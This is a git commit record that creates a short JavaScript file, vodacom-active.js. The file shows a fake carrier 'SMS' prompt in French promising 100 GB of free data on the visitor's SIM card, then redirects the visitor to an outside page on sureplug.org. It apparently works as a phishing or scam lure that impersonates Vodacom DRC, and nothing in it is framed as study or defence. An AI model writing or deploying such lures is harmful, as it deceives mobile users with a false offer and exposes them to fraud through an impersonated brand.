cab7430260eec278ffcf237aa348d9976f86f013
surepluger <adigunkola666@gmail.com>
2025-05-16 07:01:44 +0100

    Create vodacom-active.js

---
+++ vodacom-active.js
@@ -0,0 +1,5 @@
+var password = 'Activate 100 GB'
+password=prompt('SMS: Félicitations, votre carte SIM est éligible pour recevoir 100 Go de données gratuites sur votre ancienne carte SIM. Cliquez sur OK pour réclamer maintenant.','Activer 100 Go');
+if (password != 'Activer 100 Go') {
+location.href='https://sureplug.org/vodacom-drc.html';
+}
